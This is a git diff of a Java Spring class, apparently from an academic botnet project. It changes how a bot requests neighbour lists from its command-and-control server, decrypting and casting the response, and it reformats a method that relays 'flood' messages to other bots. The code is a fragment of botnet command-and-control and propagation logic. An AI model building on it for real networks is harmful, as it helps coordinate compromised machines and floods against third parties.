@@ -1,5 +1,8 @@
 package cs.sii.network.request;
 
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.OutputStream;
 import java.io.UnsupportedEncodingException;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
@@ -23,6 +26,7 @@ import org.springframework.web.client.RestTemplate;
 import cs.sii.domain.IP;
 import cs.sii.domain.Pairs;
 import cs.sii.service.crypto.CryptoPKI;
+import cs.sii.service.crypto.CryptoUtils;
 
 @Service("BotRequest")
 public class BotRequest {
@@ -45,6 +49,8 @@ public class BotRequest {
 
 	@Autowired
 	private CryptoPKI pki;
+	@Autowired
+	private CryptoUtils cUtil;
 
 	public BotRequest() {
 	}
@@ -110,8 +116,8 @@ public class BotRequest {
 	 * @param iDBot
 	 */
 
-	public ArrayList<String> askNeighbours(String iPCeC, String ipBot, String data) {
-		 ArrayList<String> result = new ArrayList<String>();
+	public ArrayList<Pairs<String,String>> askNeighbours(String iPCeC, String ipBot, String data) {
+		ArrayList<Pairs<String,String>> result = new ArrayList<Pairs<String,String>>();
 		Integer counter = 0;
 		String encryptData="";
 		try {
@@ -126,7 +132,9 @@ public class BotRequest {
 			try {
 				String url=HTTPS+ iPCeC + PORT+"/cec/neighbours";
 				System.out.println("Richiesta Vicinato a "+url);
-				result.addAll(	Arrays.asList(restTemplate.postForObject(url, encryptData, String[].class)));
+				//result.addAll(	Arrays.asList(restTemplate.postForObject(url, encryptData, String[].class)));
+				 ByteArrayInputStream rawData = new ByteArrayInputStream(restTemplate.postForObject(url, encryptData, ByteArrayOutputStream.class).toByteArray());
+				 result= (ArrayList<Pairs<String, String>>) cUtil.decrypt(rawData);
 				System.out.println("ritorna "+result);
 				return result;
 			} catch (Exception e) {
@@ -148,9 +156,9 @@ public class BotRequest {
 			try {
 				System.out.println("url request " + dnsUrl);
 				String url = HTTP + dnsUrl;
-				//Type type=new TypeToken<Pairs<IP,String>>(){}.getType();
+				// Type type=new TypeToken<Pairs<IP,String>>(){}.getType();
 				// TODO capire se la richiesta è fatta bene
-//				cec = restTemplate.getForObject(url,Pairs.class);
+				// cec = restTemplate.getForObject(url,Pairs.class);
 				cec = restTemplate.postForObject(url, null, cec.getClass());
 				return cec;
 			} catch (Exception e) {
@@ -164,12 +172,12 @@ public class BotRequest {
 			}
 		}
 	}
-	
+
 	@Async
-	public Boolean sendFloodToOtherBot(String ipBot,String msg) {
-		Boolean response=false;
-		Integer count=0;
-		while (count<REQNUMBER) {
+	public Boolean sendFloodToOtherBot(String ipBot, String msg) {
+		Boolean response = false;
+		Integer count = 0;
+		while (count < REQNUMBER) {
 			try {
 				String url = HTTPS + ipBot + PORT + "/bot/flood";
 				System.out.println("url bot flood" + url);
@@ -188,7 +196,6 @@ public class BotRequest {
 		}
 		return response;
 	}
-	
 
 	// da valutare se devono essere asincroni
 	public Pairs<Long, Integer> getChallengeFromCeC(String idBot, IP ipCeC) {
@@ -214,10 +221,6 @@ public class BotRequest {
 		}
 	}
 
-	
-	
-	
-	
 	// da valutare se devono essere asincroni
 	/**
 	 * @param idBot
